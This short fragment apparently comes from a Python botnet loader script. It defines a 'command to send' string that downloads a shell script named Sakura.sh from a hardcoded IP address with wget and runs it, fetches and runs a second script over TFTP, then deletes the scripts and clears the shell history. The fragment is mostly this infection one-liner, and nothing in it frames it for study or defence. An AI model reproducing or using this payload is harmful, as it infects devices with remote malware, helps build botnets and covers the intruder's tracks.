...
rekdevice="cd /mnt || cd /root || cd /; wget http://37.120.247.250/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g 37.120.247.250 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c" #command to send
print "\033[31m"
